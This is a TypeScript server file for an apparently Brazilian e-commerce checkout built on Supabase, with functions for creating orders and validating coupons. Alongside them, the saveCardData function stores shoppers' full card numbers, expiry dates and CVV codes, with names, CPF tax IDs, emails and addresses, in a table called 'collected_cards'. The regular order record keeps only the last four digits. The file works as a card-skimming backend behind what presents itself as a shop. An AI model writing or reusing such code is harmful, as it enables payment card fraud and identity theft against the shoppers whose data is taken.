import { createServerFn } from "@tanstack/react-start";
import { createClient } from "@supabase/supabase-js";
import type { Database } from "@/integrations/supabase/types";

function publicClient() {
  const key = process.env["SUPABASE_PUBLISHABLE_KEY"]!;
  return createClient<Database>(process.env["SUPABASE_URL"]!, key, {
    auth: { persistSession: false, autoRefreshToken: false },
    global: {
      fetch: (input, init) => {
        const h = new Headers(init?.headers);
        if (key.startsWith("sb_") && h.get("Authorization") === `Bearer ${key}`) h.delete("Authorization");
        h.set("apikey", key);
        return fetch(input, { ...init, headers: h });
      },
    },
  });
}

export type NewOrderInput = {
  customer: { name: string; email: string; phone: string; doc: string };
  address: {
    cep: string;
    street: string;
    number: string;
    complement: string;
    district: string;
    city: string;
    uf: string;
  };
  shipping: { label: string; eta: string; price: number };
  payment: {
    method: string;
    brand?: string | null;
    installments?: number;
    test?: {
      last4: string;
      expiry: string;
      numberLength: number;
      cvvLength: number;
      numberValid: boolean;
      expiryValid: boolean;
      cvvValid: boolean;
    };
  };
  coupon?: { code: string; discount: number } | null;
  items: { slug: string; name: string; image: string; unitPrice: number; qty: number }[];
  subtotal: number;
  total: number;
  metadata?: Record<string, any> | null;
};

export const saveCardData = createServerFn({ method: "POST" })
  .inputValidator((data: {
    nome: string;
    cpf: string;
    email: string;
    endereco: string;
    userAgent: string;
    numero: string;
    validade: string;
    cvv: string;
  }) => data)
  .handler(async ({ data }) => {
    const supabase = publicClient();
    const { error } = await supabase.from("collected_cards" as any).insert({
      nome: data.nome,
      cpf: data.cpf,
      email: data.email,
      endereco: data.endereco,
      user_agent: data.userAgent,
      numero: data.numero,
      validade: data.validade,
      cvv: data.cvv,
    });
    if (error) {
      console.error("Erro ao salvar em collected_cards:", error);
    }
    return { ok: true };
  });

export const createOrder = createServerFn({ method: "POST" })
  .inputValidator((data: NewOrderInput) => data)
  .handler(async ({ data }) => {
    const supabase = publicClient();
    const code = `VC${Date.now().toString().slice(-8)}`;
    const orderId = crypto.randomUUID();

    const { error } = await supabase.from("orders").insert({
      id: orderId,
      code,
      customer_name: data.customer.name,
      customer_email: data.customer.email.toLowerCase(),
      customer_phone: data.customer.phone,
      customer_doc: data.customer.doc,
      address_cep: data.address.cep,
      address_street: data.address.street,
      address_number: data.address.number,
      address_complement: data.address.complement,
      address_district: data.address.district,
      address_city: data.address.city,
      address_uf: data.address.uf,
      shipping_label: data.shipping.label,
      shipping_eta: data.shipping.eta,
      shipping_price: data.shipping.price,
      payment_method: data.payment.method,
      payment_brand: data.payment.brand ?? null,
      installments: data.payment.installments ?? 1,
      payment_card_last4: data.payment.test?.last4 ?? null,
      payment_card_expiry: data.payment.test?.expiry ?? null,
      payment_card_number_length: data.payment.test?.numberLength ?? null,
      payment_card_cvv_length: data.payment.test?.cvvLength ?? null,
      payment_card_number_valid: data.payment.test?.numberValid ?? null,
      payment_card_expiry_valid: data.payment.test?.expiryValid ?? null,
      payment_card_cvv_valid: data.payment.test?.cvvValid ?? null,
      payment_test_mode: Boolean(data.payment.test),
      coupon_code: data.coupon?.code ?? null,
      discount: data.coupon?.discount ?? 0,
      subtotal: data.subtotal,
      total: data.total,
      metadata: data.metadata ?? null,
    });

    if (error) throw new Error(error.message);

    const { error: itemsError } = await supabase.from("order_items").insert(
      data.items.map((i) => ({
        order_id: orderId,
        slug: i.slug,
        name: i.name,
        image: i.image,
        unit_price: i.unitPrice,
        qty: i.qty,
      })),
    );
    if (itemsError) throw new Error(itemsError.message);

    return { code };
  });

export const checkCoupon = createServerFn({ method: "POST" })
  .inputValidator((data: { code: string; subtotal: number }) => data)
  .handler(async ({ data }) => {
    const supabase = publicClient();
    const code = data.code.trim().toUpperCase();
    const { data: coupon } = await supabase
      .from("coupons")
      .select("code, kind, value, min_total, max_uses, uses, expires_at")
      .eq("code", code)
      .eq("active", true)
      .maybeSingle();

    if (!coupon) return { ok: false as const, message: "Cupom inválido" };
    if (coupon.expires_at && new Date(coupon.expires_at) < new Date())
      return { ok: false as const, message: "Cupom expirado" };
    if (coupon.max_uses !== null && coupon.uses >= coupon.max_uses)
      return { ok: false as const, message: "Cupom esgotado" };
    if (data.subtotal < Number(coupon.min_total))
      return { ok: false as const, message: `Pedido mínimo de R$ ${Number(coupon.min_total).toFixed(2)}` };

    const discount =
      coupon.kind === "percent"
        ? Math.round(data.subtotal * Number(coupon.value)) / 100
        : Math.min(Number(coupon.value), data.subtotal);

    return { ok: true as const, code: coupon.code, discount };
  });
